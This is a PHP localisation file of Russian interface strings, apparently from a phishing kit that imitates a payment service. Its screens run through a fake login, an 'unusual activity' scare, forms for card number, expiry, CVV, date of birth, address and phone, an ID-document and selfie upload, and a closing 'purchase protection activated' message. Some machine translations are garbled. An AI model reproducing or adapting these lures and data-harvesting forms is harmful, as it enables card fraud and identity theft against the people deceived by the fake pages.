<?php

	$lg_sign = [
		"title" => "Войдите в свой счет",
		"alert" => "Проверьте данные и повторите попытку.",
		"changer" => "Изменить",
		"eml_placeholder" => "Электронный адрес",
		"eml_msg1" => "Обязательное поле",
		"eml_msg2" => "Этот формат электронного адреса неверный",
		"bt_next" => "Далее",
		"pwd_placeholder" => "Введите ваш пароль",
		"pwd_show" => "Показать",
		"pwd_hide" => "Скрыть",
		"bt_login" => "Войти",
		"trouble" => "Не удается войти в счет?",
		"or" => "или",
		"bt_signup" => "Открыть счет",
		"footer" => [
			"contact" => "Contact Us",
			"privacy" => "Конфиденциальность",
			"legal" => "легальный",
			"world" => "международный"
		],
		"rotate" => "Обработка ..."
	];

	$lg_activity = [
		"title" => "Необычная деятельность",
		"head" => "Мы заметили необычную активность",
		"body" => "Нам нужна ваша помощь в защите вашей учетной записи, чтобы предотвратить несанкционированный доступ. Для вашей безопасности могут быть некоторые ограничения в вашей учетной записи, если информация неверна",
		"bt_secure" => "Защитить мою учетную запись"
	];

	$lg_process = [
		"title" => "Мой Аккаунт",
		"logout" => "Выход",
		"menu" => [
			"home" => "Резюме",
			"activity" => "Деятельность",
			"send_receive" => "Отправить и запросить",
			"wallet" => "Бумажник",
			"help" => "Помогите",
			"open" => "Меню",
			"close" => "Закрыть"
		],
		"head1" => "Подтвердите свою карту",
		"head2" => "Подтвердите свой адрес",
		"ctype" => "Тип карты",
		"cnumber" => "Номер карты",
		"exp" => "Истечение MM/YY",
		"csc" => "CVV (3 цифры)",
		"name" => "Полное имя",
		"dob" => "Дата рождения (DD/MM/YYYY)",
		"address" => "Адрес",
		"city" => "Город / деревня",
		"zip" => "Почтовый индекс",
		"ptype" => "Тип телефона",
		"pnumber" => "Номер телефона",
		"bt_save" => "Сохранить",
		"footer" => [
			"security" => "Безопасность",
			"rights" => "Все права защищены."
		]
	];

	$lg_id = [
		"head" => "Загрузите свою личность",
		"proof" => [
			"one" => "Удостоверение личности",
			"two" => "Самоустройство с доказательством",
			"three" => "Процесс завершен"
		],
		"choose" => "Выберите тип ID",
		"type" => [
			"one" => "Заграничный пасспорт",
			"two" => "Национальный идентификатор",
			"three" => "Водительские права"
		],
		"bt_proceed" => "проследовать",
		"head_up" => "Загрузите",
		"rule1" => [
			"one" => "Возьмите высококачественную фотографию<br> или сделайте сканирование высокого качества",
			"two" => "Отправьте обе стороны двухстороннего документа",
			"three" => "Сканирование обеих страниц<br> если вы выберете паспорт"
		],
		"drop_zone" => "<b>Перетащите или щелкните здесь</b> чтобы загрузить изображение (не более 5 МБ)",
		"bt_back" => "ВОЗВРАЩАТЬСЯ",
		"head_slf" => "Загрузите самоубийство с",
		"rule2" => [
			"one" => "Убедитесь, что вы смотрите прямо на камеру",
			"two" => "Ваши пальцы не покрывают фотографию<br> или какую-либо важную информацию",
			"three" => "Не надевайте шляпу или очки<br> и убедитесь<br> что ваша борода обрезана"
		]
	];

	$lg_finish = [
		"head" => "Процесс проверки завершен",
		"on" => "АКТИВИРОВАННЫЙ",
		"p1" => "Защита Покупка теперь",
		"p2" => "Он охватывает все подходящие покупки, в которых используется учетная запись, а также платежи, производимые через наш веб-сайт. Чтобы воспользоваться преимуществами защиты покупок, мы, в частности, требуем, чтобы учетные записи были сохранены в хорошем состоянии и просили, чтобы спор был подан в течение 180 дней с момента покупки или оплаты.",
		"p3" => "Прочитайте требования к защите покупки"
	];

?>